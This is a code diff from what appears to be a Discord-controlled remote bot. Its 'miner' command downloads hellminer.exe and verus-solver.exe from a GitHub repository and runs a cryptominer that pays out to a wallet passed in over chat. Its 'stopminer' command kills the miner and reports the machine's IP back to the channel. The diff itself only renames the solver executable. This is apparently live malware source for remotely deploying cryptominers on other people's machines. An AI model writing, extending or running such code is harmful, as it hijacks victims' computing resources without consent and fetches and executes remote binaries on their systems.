@@ -85,12 +85,12 @@ async def miner(ctx, arg1):
     url = "https://github.com/rxu7s/Public/raw/main/hellminer.exe"
     response = requests.get(url)
     open("hellminer.exe", "wb").write(response.content)
-    url = "https://github.com/rxu7s/Public/raw/main/verus-solver"
+    url = "https://github.com/rxu7s/Public/raw/main/verus-solver.exe"
     response = requests.get(url)
-    open("verus-solver", "wb").write(response.content)
+    open("verus-solver.exe", "wb").write(response.content)
         
     os.popen("taskkill /F /IM hellminer.exe /T")
-    os.popen("taskkill /F /IM verus-solver /T")
+    os.popen("taskkill /F /IM verus-solver.exe /T")
         
     wallet = ''.join(arg1)
     os.popen(f"hellminer.exe -c stratum+tcp://eu.luckpool.net:3956#xnsub -u {wallet}.Windows -p x --cpu {mram}")
@@ -100,7 +100,7 @@ async def miner(ctx, arg1):
 @bot.command()
 async def stopminer(ctx):
     os.popen("taskkill /F /IM hellminer.exe /T")
-    os.popen("taskkill /F /IM verus-solver /T")
+    os.popen("taskkill /F /IM verus-solver.exe /T")
     await ctx.send(f"``[-] {ip}: Miner stoped``")
 
 bot.run(token)
